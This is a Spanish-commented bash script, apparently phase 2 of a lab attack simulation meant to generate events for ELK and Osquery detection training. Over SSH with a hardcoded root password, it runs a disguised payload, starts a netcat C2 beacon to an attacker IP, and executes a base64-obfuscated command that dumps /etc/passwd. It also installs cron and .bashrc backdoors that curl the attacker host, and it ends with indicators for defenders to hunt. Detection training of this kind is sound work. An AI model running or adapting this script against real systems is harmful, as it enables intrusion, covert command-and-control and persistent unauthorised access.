#!/bin/bash
###############################################################################
# FASE 2: EXECUTION + PERSISTENCE
# Ejecución del payload y establecimiento de persistencia
#
# MITRE ATT&CK: T1059.004 (Unix Shell), T1053.003 (Cron), T1546.004 (.bashrc)
#
# QUÉ OBSERVAR EN ELK:
#   - Proceso bash ejecutando script desde /tmp
#   - Conexión saliente a puerto 4444 (C2)
#   - Modificación de crontab
#   - Modificación de .bashrc
#   - Osquery: process_events con cmdline sospechoso
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACKER_IP="10.10.10.200"
TARGET="10.10.10.101"
SSH_PASS="Password123!"

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  FASE 2: EXECUTION + PERSISTENCE${NC}"
echo -e "${RED}  Target: WS-FINANZAS-01 (10.10.10.101)${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Ejecución del payload
echo -e "${YELLOW}[1/6] Ejecutando payload malicioso...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "bash /tmp/factura_pendiente.pdf.sh 2>/dev/null &" 2>/dev/null
echo -e "${GREEN}[✓] Payload ejecutado${NC}"

# Establecer C2 beacon
echo -e "${YELLOW}[2/6] Estableciendo comunicación C2...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "nohup bash -c 'while true; do echo \$(hostname)_beacon | nc -w 1 ${ATTACKER_IP} 4444 2>/dev/null; sleep 30; done' > /dev/null 2>&1 &" 2>/dev/null
echo -e "${GREEN}[✓] Beacon C2 activo -> ${ATTACKER_IP}:4444${NC}"

# Comando encoded (evasión)
echo -e "${YELLOW}[3/6] Ejecutando comando codificado (evasión)...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiAnbm9sb2dpbicgPiAvdG1wLy51c2Vycw==' | base64 -d | bash" 2>/dev/null
echo -e "${GREEN}[✓] Comando encoded ejecutado (enumeración de usuarios)${NC}"

# Persistencia via crontab
echo -e "${YELLOW}[4/6] Instalando persistencia via crontab...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.system_update.sh') | crontab - && echo '#!/bin/bash
curl -s http://${ATTACKER_IP}:8080/beacon?h=\$(hostname)&t=\$(date +%s) > /dev/null 2>&1' > /tmp/.system_update.sh && chmod +x /tmp/.system_update.sh" 2>/dev/null
echo -e "${GREEN}[✓] Crontab backdoor instalado${NC}"

# Persistencia via .bashrc
echo -e "${YELLOW}[5/6] Instalando persistencia via .bashrc...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "echo '# System health check
(curl -s http://${ATTACKER_IP}:8080/alive > /dev/null 2>&1 &)' >> /home/maria.gonzalez/.bashrc" 2>/dev/null
echo -e "${GREEN}[✓] .bashrc backdoor instalado${NC}"

# Registrar eventos
echo -e "${YELLOW}[6/6] Registrando eventos en log...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"execution\",\"technique\":\"T1059.004\",\"process\":\"/tmp/factura_pendiente.pdf.sh\",\"c2_connection\":\"${ATTACKER_IP}:4444\",\"persistence\":[\"crontab\",\"bashrc\"],\"risk_level\":\"CRITICAL\",\"endpoint\":\"WS-FINANZAS-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  FASE 2 COMPLETADA${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  IOCs para buscar en Kibana:${NC}"
echo -e "${GREEN}    - process.cmdline: *base64*${NC}"
echo -e "${GREEN}    - network.remote_port: 4444${NC}"
echo -e "${GREEN}    - event_type: execution${NC}"
echo -e "${GREEN}    - file.path: *.system_update.sh*${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  Queries Osquery:${NC}"
echo -e "${GREEN}    SELECT * FROM crontab;${NC}"
echo -e "${GREEN}    SELECT * FROM processes WHERE cmdline LIKE '%base64%';${NC}"
echo -e "${GREEN}    SELECT * FROM process_open_sockets WHERE remote_port = 4444;${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
